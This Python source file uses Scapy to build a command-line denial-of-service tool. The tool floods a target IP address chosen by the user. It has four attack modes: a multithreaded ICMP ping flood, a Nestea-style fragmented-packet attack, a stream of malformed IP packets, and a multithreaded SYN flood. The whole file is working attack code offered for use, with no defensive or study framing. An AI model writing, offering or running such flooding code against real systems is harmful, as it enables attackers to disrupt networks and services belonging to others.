from scapy.all import *
import argparse

from scapy.layers.inet import TCP, IP, ICMP

thread_count = 20


def send_icmp_flooding_ping(target_ip_address: str, destination_port, size_of_packet: int = 512):
    ip = IP(dst=target_ip_address)
    icmp = ICMP()
    raw = Raw(b"X" * size_of_packet)
    p = ip / icmp / raw

    threads = []
    for thread_id in range(thread_count):
        thread = threading.Thread(target=_send_icmp_flooding_ping_thread, args=(p,), daemon=True)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

def _send_icmp_flooding_ping_thread(p):
    while True:
        try:
            send(p, loop=1, verbose=1, socket=conf.L3socket())
        except Exception as error:
            print(error)

def send_malformed_packet(destination_ip_address: str):
    send(IP(dst=destination_ip_address, ihl=2, version=3) / ICMP(), loop=1)

def send_Nestea_attack(destination_ip_address: str, destination_port):
    threads = []
    for thread_id in range(thread_count):
        thread = threading.Thread(target=_send_Nestea_attack_thread, args=(destination_ip_address, destination_port,), daemon=True)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

def _send_Nestea_attack_thread(destination_ip_address: str, destination_port):
    id = 0
    while True:
        id = (id + 1) % 1000
        send(IP(dst=destination_ip_address, id=id, flags="MF") / TCP(sport=RandShort(), dport=destination_port, flags="S") / ("X" * 1000))
        send(IP(dst=destination_ip_address, id=id, frag=48) / TCP(sport=RandShort(), dport=destination_port, flags="S") / ("X" * 11600))
        send(IP(dst=destination_ip_address, id=id, flags="MF") / TCP(sport=RandShort(), dport=destination_port, flags="S") / ("X" * 2240))

def send_SYN_attack(destination_ip_address: str, destination_port: int):
    ip = IP(dst=destination_ip_address)
    tcp = TCP(sport=RandShort(), dport=destination_port, flags="S")
    raw = Raw(b"X" * 512)
    p = ip / tcp / raw

    threads = []
    for thread_id in range(thread_count):
        thread = threading.Thread(target=_send_SYN_attack_thread, args=(p, ), daemon=True)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

def _send_SYN_attack_thread(p):
    send(p, loop=1, verbose=1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Do Flooding DOS",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-ip", "--target-ip", help="targeted ip address", required=True)
    parser.add_argument("-p", "--target-port", type=int, help="targeted port")
    parser.add_argument("-att", "--attack-type", help="ICMP or NESTEA or MALFORMED or SYN", required=True)
    parser.add_argument("-v", "--verbose", action="store_true", help="increase verbosity")
    args = parser.parse_args()
    config = vars(args)

    verbose = config["verbose"]
    if verbose:
        print(config)

    target_ip = config["target_ip"]
    target_port = config["target_port"]
    attack_type = config["attack_type"].upper()

    # TODO: REMOVE
    # attack_type = 'UNKNOWN'
    # while True:
    #     x = input("just waiting")

    if attack_type == 'ICMP':
        print('ICMP Attack')
        send_icmp_flooding_ping(target_ip, target_port)
    elif attack_type == 'NESTEA':
        print('NESTEA Attack')
        send_Nestea_attack(target_ip, target_port)
    elif attack_type == 'MALFORMED':
        print('MALFORMED Attack')
        send_malformed_packet(target_ip)
    elif attack_type == 'SYN':
        print('SYN Attack')
        send_SYN_attack(target_ip, target_port)
    else:
        print('Unknown Attack')